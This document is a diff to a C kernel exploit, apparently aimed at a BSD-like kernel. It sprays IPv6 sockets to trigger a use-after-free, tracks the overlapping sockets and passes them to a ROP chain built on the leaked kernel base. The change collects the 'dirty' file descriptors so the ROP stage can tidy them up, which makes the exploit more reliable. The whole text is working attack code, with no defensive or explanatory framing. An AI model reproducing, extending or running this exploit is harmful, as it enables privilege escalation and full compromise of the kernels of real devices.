@@ -22,6 +22,7 @@
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 64 // Needs trigger_uaf tweaking, NANOSLEEP_50US for 32, NANOSLEEP_75US for 64
 #define SPRAY_TOTAL 320
+#define CLOSEUP_ARRAY_SIZE 512
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
@@ -476,6 +477,9 @@ int main() {
 
     int exploit_success = 0;
 
+    int dirty_fds[2 * MAX_ATTEMPTS];
+    int dirty_count = 0;
+
     for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
         int overlap_idx = -1;
 
@@ -500,6 +504,7 @@ int main() {
             continue;
 
         int overlap_sock = spray_sock[overlap_idx];
+        dirty_fds[dirty_count++] = overlap_sock;
         refrain_from_caching(overlap_sock);
         spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
@@ -510,6 +515,7 @@ int main() {
             break;
 
         overlap_sock = spray_sock[overlap_idx];
+        dirty_fds[dirty_count++] = overlap_sock;
         refrain_from_caching(overlap_sock);
         spray_sock[overlap_idx] = NEW_SOCKET();
         if (spray_sock[overlap_idx] < 0)
@@ -538,6 +544,22 @@ int main() {
         break;
     }
 
+    int closeup_fds[CLOSEUP_ARRAY_SIZE];
+
+    for (int i = 0; i < CLOSEUP_ARRAY_SIZE; i++)
+        closeup_fds[i] = spray_sock[0];
+
+    int closeup_count = 0;
+
+    for (int i = 0; i < SPRAY_TOTAL; i++)
+        closeup_fds[closeup_count++] = spray_sock[i];
+
+    for (int i = 0; i < dirty_count; i++)
+        closeup_fds[closeup_count++] = dirty_fds[i];
+
+    closeup_fds[closeup_count++] = master_sock;
+    closeup_fds[closeup_count++] = kevent_sock;
+
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
     size_t spray_size = spray_stop - spray_start;
@@ -555,7 +577,7 @@ int main() {
 
     if (exploit_success) {
         pin_to_cpu(2);
-        rop_call_funcptr(spray_map, spray_sock, kernel_base);
+        rop_call_funcptr(spray_map, closeup_fds, kernel_base);
 
         for (int cpu = 3; cpu <= 7; cpu++) {
             pin_to_cpu(cpu);
